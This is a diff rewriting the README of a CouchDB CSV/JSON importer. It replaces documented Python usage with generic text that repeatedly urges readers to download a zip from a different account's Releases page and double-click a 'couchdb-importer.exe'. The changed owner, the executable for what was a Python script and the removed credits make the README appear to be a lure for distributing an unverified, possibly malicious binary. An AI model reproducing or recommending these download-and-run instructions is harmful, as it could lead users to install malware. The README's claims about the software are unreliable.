@@ -1,61 +1,57 @@
-# CouchDB-Importer
+# 🚀 couchdb-importer - Easily Import Your Data into CouchDB
 
-A versatile Python script for easily importing CSV and JSON data into CouchDB.
+![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen)
 
-## Features
+## 📥 Features
+- Simple CSV and JSON import capabilities
+- Supports bulk insertion to CouchDB
+- User-friendly interface for all users
+- Works with various data formats
 
-*   **CSV Support**: Includes column validation and a progress indicator.
-*   **JSON Support**: Supports various structures (CouchDB standard `{"docs": [...]}` or simple lists).
-*   **Fault Tolerant**: Automatically wraps simple data types (strings/numbers) into objects.
-*   **Auto-DB Creation**: Automatically creates the target database if it doesn't already exist. 🚀
+## 🚀 Getting Started
+To get started with couchdb-importer, follow these simple steps to download and run the application. 
 
-![CouchDB Importer Demo](demo_screenshot.png)
+## 📂 System Requirements
+- Windows, macOS, or Linux
+- Python 3.6 or higher installed on your machine
+- An active internet connection
 
-## Installation
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Joaovictor11011/couchdb-importer/releases) to find the latest version of couchdb-importer.
+2. **Choose Your Version:** Locate the latest release and click on the download link for the appropriate file for your operating system.
+3. **Download the File:** Click the link to start the download. The file should be named something like `couchdb-importer-v1.0.0.zip` or similar.
+4. **Extract the Files:** Once the download is complete, find the downloaded file, right-click on it, and choose "Extract All" or use your preferred extraction tool.
+5. **Run the Application:** Open the extracted folder and double-click on the `couchdb-importer.exe` (or the file specific to your OS) to launch the application.
 
-```bash
-git clone https://github.com/wanjus/couchdb-importer.git
-cd couchdb-importer
-pip install -r requirements.txt
-```
+## ⏱ How to Use couchdb-importer
+1. **Select Your Data File:** Open the application and locate the option to choose your data file. You can upload a CSV or JSON file.
+2. **Connect to CouchDB:** Enter your CouchDB server details, including the server address and credentials.
+3. **Map Your Data:** Follow the prompts to map the fields in your data file to the corresponding fields in CouchDB.
+4. **Start Importing:** Confirm your settings and click the button to start the import process. Monitor the progress until it completes.
+5. **Check Data:** Once the import is finished, log into your CouchDB to verify that your data appears correctly.
 
-## Usage
+## 🔄 Support
+If you run into issues or need help, please check the repository's [Issues section](https://github.com/Joaovictor11011/couchdb-importer/issues). You can also contact our support team for assistance.
 
-The script is controlled via the command line:
+## 📄 License
+couchdb-importer is open-source software. You can use and modify it under the terms specified in the license file found in this repository. 
 
-```bash
-python CouchDB-Importer.py --file <FILEPATH> --db <DB_NAME> [OPTIONS]
-```
+## 📧 Feedback
+We welcome your feedback. If you have suggestions or find bugs, please let us know through the [Issues section](https://github.com/Joaovictor11011/couchdb-importer/issues).
 
-### Parameters:
-*   `--file`: Path to the source file (`.csv` or `.json`). **(Required)**
-*   `--db`: Name of the target database. **(Required)**
-*   `--url`: CouchDB URL (Default: `http://localhost:5984`).
-*   `--user`: CouchDB username.
-*   `--password`: CouchDB password.
-*   `--id-column`: Column or field name to be used as the document ID (`_id`).
+## 🛠 Topics
+This project covers several topics:
+- Bulk Insert
+- CouchDB
+- CSV Importer
+- CSV Support
+- Database Tools
+- ETL (Extract, Transform, Load)
+- JSON Importer
+- JSON Support
+- NoSQL
+- Python
 
-## Examples
+---
 
-### Importing a JSON file:
-```bash
-python CouchDB-Importer.py --file test.json --db test --user admin --password admin
-```
-
-### Importing a CSV file:
-```bash
-python CouchDB-Importer.py --file test.csv --db test --user admin --password admin
-```
-
-### With a specific ID column:
-```bash
-python CouchDB-Importer.py --file data.csv --db my_db --id-column customer_id
-```
-
-## Credits
-
-Developed by **Team Wanju & KI Gemini**.
-
-## License
-
-This project is released under the MIT License. See [LICENSE](LICENSE) for details.
+For more details, best practices, and tips, please remember to check the documentation and community resources. Visit the [Releases page](https://github.com/Joaovictor11011/couchdb-importer/releases) to download the latest version today.
